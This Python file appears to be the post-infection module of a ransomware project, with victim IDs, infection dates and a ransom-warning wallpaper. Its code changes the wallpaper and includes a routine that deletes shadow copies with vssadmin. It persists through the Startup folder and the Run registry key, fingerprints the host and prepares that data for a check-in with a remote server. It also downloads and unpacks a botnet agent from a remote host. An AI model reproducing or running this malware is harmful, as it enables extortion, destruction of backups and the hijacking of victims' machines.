import os
import sys
import ctypes
import base64
from shutil import copyfile

from utils import resourcePath, aesIV_file_store_path
from hasp.RSACipher import RSACipher
class PostInfection(object):

    def __init__(self, id, mode, infection_date, rsa_pub_key):
        print("PostInfection Object Created")
        self.victim_id = id
        self.mode = mode
        self.infection_date = infection_date
        self.rsa_pub_key = rsa_pub_key
        self.wallpaper_path = resourcePath("wallpaper.png",["images"])   
        print("Wallpaper :", self.wallpaper_path)

    def changeWallpaper(self):

        _status = ctypes.windll.user32.SystemParametersInfoW(0x14, 0, self.wallpaper_path, 0x2)
        if _status:
            print("Wallpaper has been changed")
        else:
            print("The problem has occured on changing wallpaper")

    def deleteShadowFiles(self):
        os.system('vssadmin.exe delete shadows /all /quiet')

    def addToRegistry(self,var_name,value):
        import winreg

        # key we want to change is HKEY_CURRENT_USER  
        # key value is Software\Microsoft\Windows\CurrentVersion\Run 
        KEY = "Software\Microsoft\Windows\CurrentVersion\Run"
        
        # open the key to make changes to 
        openkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER,KEY,0,winreg.KEY_ALL_ACCESS) 
        
        # modifiy the opened key 
        winreg.SetValueEx(openkey,var_name,0,winreg.REG_SZ,value) 
        
        # now close the opened key 
        winreg.CloseKey(openkey) 

        # AddToRegistry("D:\\templateCoding\\abc.txt")

    def setItselfStartUpApplication(self):
        """
            create autorun program to display a warning message each time a computer is turned on
        """
        
        # TODO: try-except for KeyError
        # get startup location
        try:
            _user_profile = os.environ["USERPROFILE"]
            _startup_location = _user_profile + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            #_startup_location_2 = os.environ["APPDATA"]+"\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
        except:
            _user_profile = "/home/kali"
            _startup_location = "/home/kali/Desktop/Startup"

        aptal_path = sys.argv[0]
        if os.path.basename(sys.argv[0]) == sys.argv[0]:
            aptal_path = os.path.join(os.getcwd(),sys.argv[0])

        if self.mode == "online":
            # copy aptal.exe because it is coming with gui
            _startup_aptal_path = os.path.join(_startup_location,os.path.basename(sys.argv[0]))
            copyfile(aptal_path, _startup_aptal_path)
            print("startup aptal file ::", _startup_aptal_path)

        # copy file which consists of aes IVs 
        _startup_key_file_path = os.path.join(_startup_location,os.path.basename(aesIV_file_store_path))
        copyfile(aesIV_file_store_path, _startup_key_file_path)
        print("startup key file ::", _startup_key_file_path)


        if _startup_location != "/home/kali/Desktop/Startup":
            
            _regedit_temp = _user_profile + "\\AppData\\Local"
            # copy aes file for regedit
            _regedit_key_file_path = os.path.join(_regedit_temp, os.path.basename(aesIV_file_store_path))
            copyfile(aesIV_file_store_path,_regedit_key_file_path)
            self.addToRegistry("aptaltxt", _regedit_key_file_path)
            print("regedit key file ::", _regedit_key_file_path)
            if self.mode == "online":
                # copy gui file for regedit
                _regedit_aptal_path = os.path.join(_regedit_temp, os.path.basename(sys.argv[0]))
                copyfile(aptal_path, _regedit_aptal_path)
                self.addToRegistry("aptalgui", _regedit_aptal_path)
                print("regedit aptal file ::", _regedit_aptal_path)
                


    def collectFirstTouchInfos(self):
        import platform,socket,json,re,uuid,psutil
        try:
            info={}
            info['platform-name']=platform.system()
            info['platform-release']=platform.release()
            info['platform-version']=platform.version()
            info['platform-architecture']=platform.machine()
            info['hostname']=socket.gethostname()
            info['ip-address']=socket.gethostbyname(socket.gethostname())
            info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
            info['processor']=platform.processor()
            info['ram']=str(round(psutil.virtual_memory().total / (1024.0**3)))+" GB"
            info['infection_date'] = self.infection_date
            return json.dumps(info)
        except Exception as e:
            return "Problem Has Been Occured When Information Gathering"

    
    def firstWork(self):
        # self.deleteShadowFiles()
        try:
            self.changeWallpaper()
        except:
            print("The problem has been occurred on changing the wallpaper")
        self.setItselfStartUpApplication()
        infoself = self.collectFirstTouchInfos()

        rsa_cipher = RSACipher(self.rsa_pub_key)
        encrypted_system_info = base64.b64encode(rsa_cipher.encrypt(infoself.encode()))
        # self.firstTouch(self.collectFirstTouchInfos())


    def firstTouch(self, encryptedInformations):
        """
        POST /api/user/firsttouch
        system information encrypted with RSA public key of victim
            - id
            - infection date
            - computer name
            - user name
            - infection date
            - ram
            - cpu
            - local ip
        """
        from requests import post

        url = 'middleware/api/user/firsttouch'
        data = {'id':self.victim_id,'info': encryptedInformations}

        response = post(url, data = data)

        print(response.text)

    def botnetAgentDownload(self):
        """
            GET /botnet/agent
        """
        from zipfile import ZipFile
        from shutil import copyfileobj
        from urllib.request import urlopen

        url = "middleware/botnet/agent/botnet.zip"
        file_name = 'botnet.zip'

        with urlopen(url) as response, open(file_name, 'wb') as out_file:
            copyfileobj(response, out_file)
            with ZipFile(file_name) as zf:
                zf.extractall()
        # RUN botnot agent